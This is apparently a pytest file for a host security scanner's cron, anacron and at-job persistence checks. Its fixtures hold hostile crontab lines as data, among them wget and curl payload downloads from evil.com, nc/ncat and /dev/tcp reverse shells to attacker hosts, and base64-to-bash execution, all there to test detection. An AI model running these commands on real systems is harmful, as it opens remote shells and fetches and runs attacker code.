from __future__ import annotations

import os

from usaf.checks.persistence import cron_persistence as cron_mod
from usaf.checks.persistence.cron_persistence import (
    AnacronJobCheck,
    AtJobCheck,
    CronAnomalyCheck,
)
from usaf.models.evidence import FileEvidence
from usaf.models.severity import Severity


class TestCronAnomalyCheck:
    def test_passes_with_no_cron_data(self):
        check = CronAnomalyCheck()
        result = check.evaluate({"cron": {"system_crontab": [], "cron_dirs": [], "user_crontabs": []}})
        assert result.passed
        assert len(result.findings) == 0

    def test_passes_with_empty_cron_dict(self):
        check = CronAnomalyCheck()
        result = check.evaluate({"cron": {}})
        assert result.passed
        assert len(result.findings) == 0

    def test_passes_with_normal_cron_jobs(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [{"file": "/etc/crontab", "content": "0 5 * * * root logrotate"}],
                "cron_dirs": [],
                "user_crontabs": [],
            }
        })
        assert result.passed
        assert len(result.findings) == 0

    def test_fails_with_suspicious_wget_pattern(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [],
                "cron_dirs": [{"file": "/etc/cron.d/evil", "content": "* * * * * root wget http://evil.com/payload.sh"}],
                "user_crontabs": [],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1
        f = result.findings[0]
        assert "wget" in str(f.detected_value).lower() or "wget" in str(f.title).lower()

    def test_fails_with_curl_download_pattern(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [],
                "cron_dirs": [],
                "user_crontabs": [{"file": "/var/spool/cron/crontabs/user", "content": "*/5 * * * * curl.*-o /tmp/update http://evil.com/payload"}],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1
        f = result.findings[0]
        assert "curl" in str(f.detected_value).lower()

    def test_fails_with_base64_decode_pattern(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [{"file": "/etc/crontab", "content": "0 3 * * * root echo encoded | base64.*-d | bash"}],
                "cron_dirs": [],
                "user_crontabs": [],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1
        assert "base64" in str(result.findings[0].detected_value).lower()

    def test_fails_with_nc_reverse_shell_pattern(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [],
                "cron_dirs": [{"file": "/etc/cron.d/conn", "content": "*/10 * * * * root nc\\s -e /bin/sh attacker.com 4444"}],
                "user_crontabs": [],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1

    def test_fails_with_ncat_reverse_shell_pattern(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [],
                "cron_dirs": [{"file": "/etc/cron.d/conn", "content": "*/10 * * * * root ncat\\s -e /bin/sh 10.0.0.1 5555"}],
                "user_crontabs": [],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1
        assert "ncat" in str(result.findings[0].detected_value).lower()

    def test_fails_with_chmod_plus_x_pattern(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [],
                "cron_dirs": [],
                "user_crontabs": [{"file": "/var/spool/cron/crontabs/user", "content": "*/5 * * * * chmod \\+x /tmp/evil.sh && /tmp/evil.sh"}],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1
        assert "chmod" in str(result.findings[0].detected_value).lower()

    def test_fails_with_bash_c_pattern(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [],
                "cron_dirs": [{"file": "/etc/cron.d/cmd", "content": "* * * * * root bash -c 'wget http://evil.com/payload'"}],
                "user_crontabs": [],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1
        assert "bash -c" in str(result.findings[0].description)

    def test_fails_with_python_c_pattern(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [{"file": "/etc/crontab", "content": "0 5 * * * root python3 -c 'import os; os.system(\"wget\")'"}],
                "cron_dirs": [],
                "user_crontabs": [],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1

    def test_fails_with_perl_e_pattern(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [],
                "cron_dirs": [{"file": "/etc/cron.d/perl", "content": "* * * * * root perl -e 'system(\"wget http://evil.com/payload\")'"}],
                "user_crontabs": [],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1

    def test_fails_with_sh_c_pattern(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [],
                "cron_dirs": [],
                "user_crontabs": [{"file": "/var/spool/cron/crontabs/user", "content": "@reboot sh -c '/tmp/evil.sh &'"}],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1

    def test_fails_with_mkfifo_pattern(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [],
                "cron_dirs": [],
                "user_crontabs": [{"file": "/var/spool/cron/crontabs/user", "content": "*/5 * * * * mkfifo /tmp/fifo && cat /tmp/fifo | sh"}],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1

    def test_fails_with_dev_tcp_pattern(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [{"file": "/etc/crontab", "content": "0 5 * * * root bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"}],
                "cron_dirs": [],
                "user_crontabs": [],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1
        assert "/dev/tcp/" in str(result.findings[0].detected_value)

    def test_detects_suspicious_comment_backdoor(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [{"file": "/etc/crontab", "content": "# backdoor for access\n0 5 * * * root /some/script.sh"}],
                "cron_dirs": [],
                "user_crontabs": [],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1
        f = result.findings[0]
        assert "backdoor" in str(f.detected_value).lower()

    def test_detects_suspicious_comment_miner(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [],
                "cron_dirs": [{"file": "/etc/cron.d/xmrig", "content": "# miner startup\n*/10 * * * * root /opt/xmrig/xmrig"}],
                "user_crontabs": [],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1
        f = result.findings[0]
        assert "miner" in str(f.detected_value).lower()

    def test_suspicious_command_takes_precedence_over_comment(self):
        """If both suspicious command and suspicious comment exist, command is reported."""
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [{"file": "/etc/crontab", "content": "0 5 * * * root wget http://evil.com/payload && # backdoor comment"}],
                "cron_dirs": [],
                "user_crontabs": [],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1
        f = result.findings[0]
        assert f.id.endswith("-001")

    def test_benign_cron_patterns_do_not_trigger(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [{"file": "/etc/crontab", "content": "0 5 * * * root certbot renew"}],
                "cron_dirs": [
                    {"file": "/etc/cron.d/apt", "content": "*/10 * * * * root apt update"},
                    {"file": "/etc/cron.d/logrotate", "content": "0 6 * * * root logrotate /etc/logrotate.conf"},
                ],
                "user_crontabs": [{"file": "/var/spool/cron/crontabs/user", "content": "0 3 * * * updatedb"}],
            }
        })
        assert result.passed
        assert len(result.findings) == 0

    def test_anacron_in_cron_is_not_suspicious(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [{"file": "/etc/crontab", "content": "0 5 * * * root anacron"}],
                "cron_dirs": [],
                "user_crontabs": [],
            }
        })
        assert result.passed
        assert len(result.findings) == 0

    def test_multiple_suspicious_entries_produces_multiple_findings(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [{"file": "/etc/crontab", "content": "0 5 * * * root wget http://evil.com/payload"}],
                "cron_dirs": [{"file": "/etc/cron.d/evil", "content": "*/10 * * * * root bash -c /tmp/evil.sh"}],
                "user_crontabs": [],
            }
        })
        assert not result.passed
        assert len(result.findings) == 2

    def test_has_mitre_mapping(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [{"file": "/etc/crontab", "content": "0 5 * * * root wget http://evil.com/payload"}],
                "cron_dirs": [],
                "user_crontabs": [],
            }
        })
        assert len(result.findings) == 1
        f = result.findings[0]
        assert len(f.mitre_attack_ids) > 0
        assert "T1053.003" in f.mitre_attack_ids

    def test_has_finding_proper_evidence(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [{"file": "/etc/crontab", "content": "0 5 * * * root wget http://evil.com/payload"}],
                "cron_dirs": [],
                "user_crontabs": [],
            }
        })
        assert len(result.findings) == 1
        f = result.findings[0]
        assert isinstance(f.evidence, FileEvidence)
        assert f.evidence.path == "/etc/crontab"
        assert "wget" in (f.evidence.content or "")

    def test_severity_and_metadata(self):
        check = CronAnomalyCheck()
        assert check.id == "PER-101"
        assert check.severity == Severity.HIGH
        assert check.category.value == "PERSISTENCE"
        assert "cron" in check.tags
        assert "persistence" in check.tags

    def test_suspicious_entry_in_user_crontab(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [],
                "cron_dirs": [],
                "user_crontabs": [{"file": "/var/spool/cron/crontabs/root", "content": "0 0 * * * wget http://evil.com/payload"}],
            }
        })
        assert not result.passed
        assert len(result.findings) == 1
        assert "wget" in str(result.findings[0].detected_value).lower()

    def test_cron_entry_with_comment_only_no_finding(self):
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [{"file": "/etc/crontab", "content": "# just a comment\n# another comment"}],
                "cron_dirs": [],
                "user_crontabs": [],
            }
        })
        assert result.passed
        assert len(result.findings) == 0

    def test_benign_wget_reference_in_certbot_not_suspicious(self):
        """Certbot references to wget-log should be benign since certbot is in benign list."""
        check = CronAnomalyCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [{"file": "/etc/crontab", "content": "0 5 * * * root certbot renew --quiet"}],
                "cron_dirs": [],
                "user_crontabs": [],
            }
        })
        assert result.passed
        assert len(result.findings) == 0


class TestAnacronJobCheck:
    def test_passes_with_no_anacron(self, monkeypatch):
        monkeypatch.setattr(os.path, "exists", lambda p: False)
        monkeypatch.setattr(os.path, "isdir", lambda p: False)
        check = AnacronJobCheck()
        result = check.evaluate({"cron": {"system_crontab": []}})
        assert result.passed
        assert len(result.findings) == 0

    def test_passes_with_benign_system_cron_entry(self, monkeypatch):
        monkeypatch.setattr(os.path, "exists", lambda p: False)
        monkeypatch.setattr(os.path, "isdir", lambda p: False)
        check = AnacronJobCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [
                    {"file": "/etc/cron.d/logrotate", "content": "0 6 * * * root logrotate /etc/logrotate.conf"},
                ]
            }
        })
        assert result.passed
        assert len(result.findings) == 0

    def test_passes_with_anacron_entry_no_suspicious_pattern(self, monkeypatch):
        monkeypatch.setattr(os.path, "exists", lambda p: False)
        monkeypatch.setattr(os.path, "isdir", lambda p: False)
        check = AnacronJobCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [
                    {"file": "/etc/anacrontab", "content": "1 5 cron.daily run-parts /etc/cron.daily"},
                ]
            }
        })
        assert result.passed
        assert len(result.findings) == 0

    def test_passes_with_benign_command_in_anacrontab_file(self, tmp_path, monkeypatch):
        anacron_tab = tmp_path / "anacrontab"
        anacron_tab.write_text("1 5 cron.daily run-parts /etc/cron.daily")
        monkeypatch.setattr(cron_mod, "ANACRON_TABS", str(anacron_tab))
        monkeypatch.setattr(os.path, "isdir", lambda p: False)
        check = AnacronJobCheck()
        result = check.evaluate({"cron": {"system_crontab": []}})
        assert result.passed
        assert len(result.findings) == 0

    def test_fails_with_suspicious_anacron_via_system_cron(self, monkeypatch):
        monkeypatch.setattr(os.path, "exists", lambda p: False)
        monkeypatch.setattr(os.path, "isdir", lambda p: False)
        check = AnacronJobCheck()
        result = check.evaluate({
            "cron": {
                "system_crontab": [
                    {"file": "/etc/anacrontab", "content": "1 5 cron.daily wget http://evil.com/payload"},
                ]
            }
        })
        assert not result.passed
        assert len(result.findings) == 1

    def test_fails_with_suspicious_anacron_via_anacrontab_file(self, tmp_path, monkeypatch):
        anacron_tab = tmp_path / "anacrontab"
        anacron_tab.write_text("1 5 cron.daily wget http://evil.com/payload")
        monkeypatch.setattr(cron_mod, "ANACRON_TABS", str(anacron_tab))
        monkeypatch.setattr(os.path, "isdir", lambda p: False)
        check = AnacronJobCheck()
        result = check.evaluate({"cron": {"system_crontab": []}})
        assert not result.passed
        assert len(result.findings) == 1
        f = result.findings[0]
        assert "wget" in (f.evidence.content or "").lower()

    def test_fails_with_too_many_spool_files(self, monkeypatch, tmp_path):
        monkeypatch.setattr(os.path, "exists", lambda p: False)
        spool_dir = tmp_path / "anacron_spool"
        spool_dir.mkdir()
        for i in range(15):
            (spool_dir / f"job_{i}").touch()
        monkeypatch.setattr(cron_mod, "ANACRON_SPOOL", str(spool_dir))
        monkeypatch.setattr(os.path, "isdir", lambda p: p == str(spool_dir))
        check = AnacronJobCheck()
        result = check.evaluate({"cron": {"system_crontab": []}})
        assert not result.passed
        assert len(result.findings) == 1
        f = result.findings[0]
        assert "15" in str(f.description)
        assert "spool" in str(f.description).lower()

    def test_fails_with_both_suspicious_command_and_many_spool(self, tmp_path, monkeypatch):
        anacron_tab = tmp_path / "anacrontab"
        anacron_tab.write_text("1 5 daily wget http://evil.com/payload")
        spool_dir = tmp_path / "anacron_spool"
        spool_dir.mkdir()
        for i in range(12):
            (spool_dir / f"job_{i}").touch()
        monkeypatch.setattr(cron_mod, "ANACRON_TABS", str(anacron_tab))
        monkeypatch.setattr(cron_mod, "ANACRON_SPOOL", str(spool_dir))
        monkeypatch.setattr(os.path, "isdir", lambda p: p == str(spool_dir))
        check = AnacronJobCheck()
        result = check.evaluate({"cron": {"system_crontab": []}})
        assert not result.passed
        assert len(result.findings) == 1
        f = result.findings[0]
        assert "wget" in (f.evidence.content or "").lower()
        assert "12" in str(f.description)

    def test_benign_command_in_anacron_does_not_fail(self, tmp_path, monkeypatch):
        anacron_tab = tmp_path / "anacrontab"
        anacron_tab.write_text("1 5 daily updatedb")
        monkeypatch.setattr(cron_mod, "ANACRON_TABS", str(anacron_tab))
        monkeypatch.setattr(os.path, "isdir", lambda p: False)
        check = AnacronJobCheck()
        result = check.evaluate({"cron": {"system_crontab": []}})
        assert result.passed
        assert len(result.findings) == 0

    def test_has_mitre_mapping(self, tmp_path, monkeypatch):
        anacron_tab = tmp_path / "anacrontab"
        anacron_tab.write_text("1 5 daily wget http://evil.com/payload")
        monkeypatch.setattr(cron_mod, "ANACRON_TABS", str(anacron_tab))
        monkeypatch.setattr(os.path, "isdir", lambda p: False)
        check = AnacronJobCheck()
        result = check.evaluate({"cron": {"system_crontab": []}})
        assert len(result.findings) == 1
        f = result.findings[0]
        assert len(f.mitre_attack_ids) > 0
        assert "T1053.003" in f.mitre_attack_ids

    def test_has_finding_proper_evidence(self, tmp_path, monkeypatch):
        anacron_tab = tmp_path / "anacrontab"
        anacron_tab.write_text("1 5 daily wget http://evil.com/payload")
        monkeypatch.setattr(cron_mod, "ANACRON_TABS", str(anacron_tab))
        monkeypatch.setattr(os.path, "isdir", lambda p: False)
        check = AnacronJobCheck()
        result = check.evaluate({"cron": {"system_crontab": []}})
        assert len(result.findings) == 1
        f = result.findings[0]
        assert isinstance(f.evidence, FileEvidence)
        assert "wget" in (f.evidence.content or "")
        assert f.false_positive_probability == 0.4

    def test_severity_and_metadata(self):
        check = AnacronJobCheck()
        assert check.id == "PER-102"
        assert check.severity == Severity.MEDIUM
        assert check.category.value == "PERSISTENCE"


class TestAtJobCheck:
    def test_passes_with_at_spool_and_allow_exists(self, tmp_path, monkeypatch):
        spool_dir = tmp_path / "at_spool"
        spool_dir.mkdir()
        (spool_dir / "a00001").touch()
        allow_file = tmp_path / "at.allow"
        allow_file.touch()
        monkeypatch.setattr(cron_mod, "AT_SPOOL_DIR", str(spool_dir))
        monkeypatch.setattr(cron_mod, "AT_ALLOW", str(allow_file))
        monkeypatch.setattr(os.path, "exists", lambda p: p == str(allow_file))
        monkeypatch.setattr(os.path, "isdir", lambda p: p == str(spool_dir))
        check = AtJobCheck()
        result = check.evaluate({"cron": {}})
        assert not result.passed
        assert len(result.findings) == 1
        f = result.findings[0]
        assert "1 at job(s)" in str(f.description)

    def test_passes_with_no_at_spool_and_no_allow_deny_on_system(self, monkeypatch):
        monkeypatch.setattr(os.path, "isdir", lambda p: False)
        monkeypatch.setattr(os.path, "exists", lambda p: False)
        check = AtJobCheck()
        result = check.evaluate({"cron": {}})
        assert not result.passed
        assert len(result.findings) == 1
        f = result.findings[0]
        assert "at.allow" in str(f.description)

    def test_fails_when_no_at_allow_or_at_deny_exists(self, tmp_path, monkeypatch):
        spool_dir = tmp_path / "at_spool"
        spool_dir.mkdir()
        (spool_dir / "a00001").touch()
        monkeypatch.setattr(cron_mod, "AT_SPOOL_DIR", str(spool_dir))
        monkeypatch.setattr(cron_mod, "AT_ALLOW", str(tmp_path / "at.allow.nonexistent"))
        monkeypatch.setattr(cron_mod, "AT_DENY", str(tmp_path / "at.deny.nonexistent"))
        monkeypatch.setattr(os.path, "isdir", lambda p: p == str(spool_dir))
        monkeypatch.setattr(os.path, "exists", lambda p: False)
        check = AtJobCheck()
        result = check.evaluate({"cron": {}})
        assert not result.passed
        assert len(result.findings) == 1
        f = result.findings[0]
        assert "no at.allow or at.deny" in str(f.description).lower()

    def test_fails_when_only_at_allow_exists_and_at_jobs_present(self, tmp_path, monkeypatch):
        spool_dir = tmp_path / "at_spool"
        spool_dir.mkdir()
        (spool_dir / "a00001").touch()
        allow_file = tmp_path / "at.allow"
        allow_file.write_text("root\n")
        monkeypatch.setattr(cron_mod, "AT_SPOOL_DIR", str(spool_dir))
        monkeypatch.setattr(cron_mod, "AT_ALLOW", str(allow_file))
        monkeypatch.setattr(os.path, "isdir", lambda p: p == str(spool_dir))
        monkeypatch.setattr(os.path, "exists", lambda p: p == str(allow_file))
        check = AtJobCheck()
        result = check.evaluate({"cron": {}})
        assert not result.passed
        assert len(result.findings) == 1
        f = result.findings[0]
        assert "at job(s)" in str(f.description)

    def test_passes_with_spool_dir_not_existing(self, monkeypatch):
        monkeypatch.setattr(os.path, "isdir", lambda p: False)
        monkeypatch.setattr(os.path, "exists", lambda p: True)
        check = AtJobCheck()
        result = check.evaluate({"cron": {}})
        assert result.passed
        assert len(result.findings) == 0

    def test_fails_with_multiple_at_jobs_and_no_restrictions(self, tmp_path, monkeypatch):
        spool_dir = tmp_path / "at_spool"
        spool_dir.mkdir()
        for i in range(5):
            (spool_dir / f"a{i:05d}").touch()
        monkeypatch.setattr(cron_mod, "AT_SPOOL_DIR", str(spool_dir))
        monkeypatch.setattr(cron_mod, "AT_ALLOW", str(tmp_path / "nonexistent_allow"))
        monkeypatch.setattr(cron_mod, "AT_DENY", str(tmp_path / "nonexistent_deny"))
        monkeypatch.setattr(os.path, "isdir", lambda p: p == str(spool_dir))
        monkeypatch.setattr(os.path, "exists", lambda p: False)
        check = AtJobCheck()
        result = check.evaluate({"cron": {}})
        assert not result.passed
        assert len(result.findings) == 1
        f = result.findings[0]
        assert "5" in str(f.description)
        assert "no at.allow" in str(f.description).lower()

    def test_has_mitre_mapping(self, tmp_path, monkeypatch):
        spool_dir = tmp_path / "at_spool"
        spool_dir.mkdir()
        (spool_dir / "a00001").touch()
        monkeypatch.setattr(cron_mod, "AT_SPOOL_DIR", str(spool_dir))
        monkeypatch.setattr(cron_mod, "AT_ALLOW", str(tmp_path / "nonexistent_allow"))
        monkeypatch.setattr(cron_mod, "AT_DENY", str(tmp_path / "nonexistent_deny"))
        monkeypatch.setattr(os.path, "isdir", lambda p: p == str(spool_dir))
        monkeypatch.setattr(os.path, "exists", lambda p: False)
        check = AtJobCheck()
        result = check.evaluate({"cron": {}})
        assert len(result.findings) == 1
        f = result.findings[0]
        assert len(f.mitre_attack_ids) > 0
        assert "T1053.002" in f.mitre_attack_ids

    def test_has_finding_proper_evidence(self, tmp_path, monkeypatch):
        spool_dir = tmp_path / "at_spool"
        spool_dir.mkdir()
        (spool_dir / "a00001").touch()
        allow_file = tmp_path / "at.allow"
        allow_file.touch()
        monkeypatch.setattr(cron_mod, "AT_SPOOL_DIR", str(spool_dir))
        monkeypatch.setattr(cron_mod, "AT_ALLOW", str(allow_file))
        monkeypatch.setattr(cron_mod, "AT_DENY", str(tmp_path / "nonexistent_deny"))
        monkeypatch.setattr(os.path, "isdir", lambda p: p == str(spool_dir))
        monkeypatch.setattr(os.path, "exists", lambda p: p == str(allow_file))
        check = AtJobCheck()
        result = check.evaluate({"cron": {}})
        assert len(result.findings) == 1
        f = result.findings[0]
        assert isinstance(f.evidence, FileEvidence)
        assert f.evidence.path is not None
        assert "Spool entries" in (f.evidence.content or "")
        assert f.confidence.value in ("LOW", "MEDIUM")

    def test_severity_and_metadata(self):
        check = AtJobCheck()
        assert check.id == "PER-103"
        assert check.severity == Severity.MEDIUM
        assert check.category.value == "PERSISTENCE"
